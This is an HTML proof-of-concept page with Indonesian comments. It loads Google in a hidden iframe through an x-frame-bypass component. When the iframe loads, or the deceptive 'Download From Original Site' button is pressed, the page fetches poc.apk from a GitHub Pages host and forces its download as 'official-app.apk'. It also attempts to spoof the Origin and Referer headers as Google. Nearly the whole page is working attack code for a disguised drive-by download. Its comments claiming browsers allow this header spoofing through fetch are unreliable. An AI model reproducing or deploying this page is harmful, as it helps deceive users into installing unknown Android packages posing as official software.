<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="Referrer-Policy" content="origin"> <!-- Global policy: Kirim origin ke cross-origin -->
  <script type="module" src="https://unpkg.com/x-frame-bypass"></script> <!-- Load x-frame-bypass Web Component -->
  <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script> <!-- Polyfill untuk custom elements -->
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
  border-radius: 8px;
}
.hidden-iframe {
  position: absolute;
  left: -9999px; /* Sembunyikan iframe */
  width: 1px;
  height: 1px;
}
</style>
</head>
<body>
  <!-- Iframe dengan x-frame-bypass: Load Google tanpa blokir SAMEORIGIN -->
  <iframe is="x-frame-bypass" class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()"></iframe>
  
  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>

  <script>
function simulateDownload() {
  setTimeout(async function(){
    try {
      // Fallback: Jika iframe gagal, simulasi context Google via proxy (adaptasi example-mu)
      let effectiveOrigin = 'https://www.google.com'; // Default dari iframe
      try {
        // Tes load Google via proxy untuk confirm context (no real load, pure referrer sim)
        const proxyResponse = await fetch('https://cors-anywhere.herokuapp.com/https://www.google.com', {
          method: 'HEAD',
          referrerPolicy: 'origin',
          headers: { 'Origin': effectiveOrigin } // Spoof origin seperti example-mu
        });
        if (proxyResponse.ok) {
          console.log('Proxy fallback: Google context confirmed');
        }
      } catch (proxyErr) {
        console.warn('Proxy fallback gagal:', proxyErr); // CORS-anywhere butuh request header dulu di https://cors-anywhere.herokuapp.com/corsdemo
      }

      // Fetch APK dengan spoof referrer (origin dari Google context)
      const response = await fetch('https://aliothme.github.io/poc.apk', {
        method: 'GET',
        referrerPolicy: 'origin', // Kirim origin (Google) ke GitHub
        headers: {
          'Origin': effectiveOrigin, // Spoof Origin header seperti example-mu (bantu server-side log)
          'Referer': effectiveOrigin // Explicit Referer (Chrome 142 allow via fetch)
        }
      });

      if (!response.ok) throw new Error('Fetch gagal');

      const blob = await response.blob();
      const blobUrl = URL.createObjectURL(blob); // Blob: Origin hilang (sukses bypass)

      // Virtual anchor download
      const a = document.createElement('a');
      a.href = blobUrl;
      a.download = 'official-app.apk';
      a.rel = 'noopener'; // Isolasi context
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);

      console.log('Download dipicu - Referer di DevTools: https://www.google.com (origin blob: kosong per spec)');
    } catch (error) {
      console.error('Error:', error);
    }
  }, 2000); // Delay untuk context settle
}

function a(){
  // Reload iframe bypass untuk fresh load
  const iframe = document.querySelector('.hidden-iframe');
  iframe.src = 'https://www.google.com'; // Trigger onload
}
  </script>
</body>
</html>
